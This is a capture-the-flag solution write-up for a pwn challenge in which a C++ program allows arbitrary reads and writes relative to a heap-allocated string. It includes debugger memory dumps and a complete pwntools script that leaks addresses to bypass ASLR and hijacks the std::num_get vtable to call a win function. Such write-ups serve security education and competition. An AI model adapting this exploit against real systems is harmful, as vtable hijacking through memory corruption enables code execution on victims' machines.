# Heap Poke and Peek &mdash; Solution

This is a similar challenge to [Poke And Peak](https://github.com/blockhousetech/TBTL-CTF/tree/master/2023/Pwn/poke_and_peek) from last year. This time, however, the string has to be longer and its data will be allocated on heap.

The C++ binary allows the user to read and write bytes at an arbitrary 32-bit offset from the data stored in a `std::string`.

```c
 ...
    getline(cin, line);
    istringstream iss(line);
    string command;
    iss >> command;
    if (command == POKE_CMD) {
      int x, y;
      if (!(iss >> x >> y)) {
        cout << HELP.at(POKE_CMD) << endl;
        continue ;
      }
      s[x] = char(y);
    } else if (command == PEEK_CMD) {
      int x;
      if (!(iss >> x)) {
        cout << HELP.at(PEEK_CMD) << endl;
        continue ;
      }
      cout << int(s[x]) << endl;
    }
...
```

The general exploit idea is simple, we need to find a function pointer in the nearby memory, overwrite it with the address of the conveniently provided `win` function and trigger the function pointer.

We start the process by figuring out where is our `std::string` payload stored in the programs memory. Entering the `tbtltbtltbtltbtltbtltbtltbtltbtl` as the input and investigating with the debugger reveals that the payload is stored on the heap as expected. Since `getline` discards the newline character, the first string is our payload.

```bash
gef➤  grep tbtltbtltbtltbtltbtltbtltbtltbtl
[+] Searching 'tbtltbtltbtltbtltbtltbtltbtltbtl' in memory
[+] In '[heap]'(0x559604407000-0x559604428000), permission=rw-
  0x559604418e90 - 0x559604418eb0  →   "tbtltbtltbtltbtltbtltbtltbtltbtl"
  0x5596044194e0 - 0x559604419502  →   "tbtltbtltbtltbtltbtltbtltbtltbtl\n"
```

We now examine the memory map of the process, and discover that the stack is too far away to be overwriten by a 32-bit offset. Hence, we either need to find a function pointer to overwrite on the heap or in the nearby data segment.

```bash
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00559604200000 0x00559604206000 0x00000000000000 r-x /src/chall
0x00559604405000 0x00559604406000 0x00000000005000 r-- /src/chall
0x00559604406000 0x00559604407000 0x00000000006000 rw- /src/chall
0x00559604407000 0x00559604428000 0x00000000000000 rw- [heap]
0x007f4458fa2000 0x007f445913f000 0x00000000000000 r-x /lib/x86_64-linux-gnu/libm-2.27.so
...
0x007f4459efc000 0x007f4459efd000 0x0000000002a000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x007f4459efd000 0x007f4459efe000 0x00000000000000 rw-
0x007ffda6f6e000 0x007ffda6f8f000 0x00000000000000 rw- [stack]
0x007ffda6faf000 0x007ffda6fb3000 0x00000000000000 r-- [vvar]
0x007ffda6fb3000 0x007ffda6fb5000 0x00000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
```

Quick search finds no suitable function pointers on the heap, but plenty in the data segment. The model solution will overwrite the sequence of pointers from `std::cout` to the virtual table of the `std::num_get` class, and point them to a newly built virtual table (where, of course, all entries point to the `win` function). The `std::num_get` class is used when parsing numeric values and can, therefore, be easily triggered by issuing `poke` comamnds.

```bash
0x00559604406000│+0x0000: <data_start+0> add BYTE PTR [rax], al
0x00559604406008│+0x0008: 0x00559604406008  →  [loop detected]
0x00559604406010│+0x0010: 0x007f44599db210  →  <__gxx_personality_v0+0> push r15
0x00559604406018│+0x0018:  add BYTE PTR [rax], al
0x00559604406020│+0x0020: 0x007f4459cc9960  →  0x007f4459a5b8f0  →  <std::basic_ostream<char,+0> mov rax, QWORD PTR [rip+0x26fa31]        # 0x7f4459ccb328
0x00559604406028│+0x0028: 0x007f4459cc9988  →  0x007f4459a5b920  →  <virtual+0> mov rax, QWORD PTR [rdi]
0x00559604406030│+0x0030: <std::cout@@GLIBCXX_3.4+16> (bad)
0x00559604406038│+0x0038: <std::cout@@GLIBCXX_3.4+24> add BYTE PTR [rax], al
...
0x00559604406118│+0x0118: 0x007f4459cd00c0  →  0x007f4459cc57b0  →  0x007f4459a01b10  →  <std::ctype<char>::~ctype()+0> mov rax, QWORD PTR [rip+0x2ca059]        # 0x7f4459ccbb70
0x00559604406120│+0x0120: 0x007f4459cd0050  →  0x007f4459cc93c8  →  0x007f4459a4a420  →  <std::num_put<char,+0> mov rax, QWORD PTR [rip+0x280f49]        # 0x7f4459ccb370
0x00559604406128│+0x0128: 0x007f4459cd0060  →  0x007f4459cc9350  →  0x007f4459a4a400  →  <std::num_get<char,+0> mov rax, QWORD PTR [rip+0x280bf1]        # 0x7f4459ccaff8
```

Since [ASLR](https://ctf101.org/binary-exploitation/address-space-layout-randomization/) is used, the offset between our payload and the data segment is not fixed, and several steps are needed before we can overwrite the pointers.
* We read the heap start address at a fixed offset (`0x58`) from the payload and use it to calculate the exact address of the payload.
* We read an address from the data segment at a fixed offset (`0xb8`) from the payload and combine it with the payload address to find the offset to the data segment.

```bash
gef➤  telescope 0x559604418e90 -l 0x100
0x00559604418e90│+0x0000: "tbtltbtltbtltbtltbtltbtltbtltbtl"
0x00559604418e98│+0x0008: "tbtltbtltbtltbtltbtltbtl"
0x00559604418ea0│+0x0010: "tbtltbtltbtltbtl"
0x00559604418ea8│+0x0018: "tbtltbtl"
0x00559604418eb0│+0x0020: 0x6f2065756c617600
0x00559604418eb8│+0x0028: "f character at index a"
0x00559604418ec0│+0x0030: "ter at index a"
0x00559604418ec8│+0x0038: 0x0061207865646e ("ndex a"?)
0x00559604418ed0│+0x0040: 0x0000000000000000
0x00559604418ed8│+0x0048: 0x00000000000061 ("a"?)
0x00559604418ee0│+0x0050: 0x0000000000000000
0x00559604418ee8│+0x0058: 0x00559604407010  →  0x0000000100000100
0x00559604418ef0│+0x0060: " <integer b>: changes character at index a to asci[...]"
...
0x00559604418f28│+0x0098: 0x00000000622065 ("e b"?)
0x00559604418f30│+0x00a0: 0x0000000000000000
0x00559604418f38│+0x00a8: 0x00000000000071 ("q"?)
0x00559604418f40│+0x00b0: 0x0000000000000001
0x00559604418f48│+0x00b8: 0x00559604406368  →  <HELP+8> add BYTE PTR [rax], al
0x00559604418f50│+0x00c0: 0x0000000000000000
0x00559604418f58│+0x00c8: 0x00559604419000  →  0x0000000000000000
0x00559604418f60│+0x00d0: 0x00559604418f70  →  0x0000006b656570 ("peek"?)
0x00559604418f68│+0x00d8: 0x0000000000000004
...

```

Putting it all together:
```python
#!/usr/bin/env python3

from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 12348)
    else:
        p = process('./chall')
        gdb.attach(p, '''
          continue
        ''')
    return p

def poke(p, x, y):
    p.sendlineafter(b':\n', 'poke {} {}'.format(x, y).encode())

def peek(p, x):
    p.sendlineafter(b':\n', 'peek {}'.format(x).encode())
    return int(p.recvline())

def peekq(p, x):
    b = [(peek(p, x+i)+256)%256 for i in range(8)]
    return unpack(bytes(b))

def pokeq(p, x, y):
    for i, c in enumerate(pack(y)):
        poke(p, x+i, c)

p = conn()
str_payload = b'tbtltbtltbtltbtltbtltbtltbtltbtl'
p.sendlineafter(b':', str_payload)

# Find the address of the payload
heap_offset = 0x58
heap_addr = peekq(p, heap_offset)
str_addr = heap_addr + 0x11e80
print('str_addr          ={:016x}'.format(str_addr))

# Find the data_start address
help_start_offset = 0xb8
help_addr = peekq(p, help_start_offset)
data_start_addr = help_addr-0x368
data_start_offset = data_start_addr-str_addr
print('data_start_addr   ={:016x}'.format(data_start_addr))

# Build a dummy vtable
win_addr = data_start_addr - 0x2047e6
ptr1 = data_start_addr + 0x400
ptr1_offset = data_start_offset + 0x400
for i in range(0x4):
    pokeq(p, ptr1_offset+i*8, win_addr)

# Overwrite num_get pointers to the dummy vtable
t_numget_offset = data_start_offset + 0x120
ptr2 = data_start_addr + 0x480
ptr2_offset = data_start_offset+ 0x480
pokeq(p, ptr2_offset, ptr1)
pokeq(p, t_numget_offset, ptr2)

# Trigger the win function
p.sendlineafter(b':', b'peek 0')

p.interactive()
```
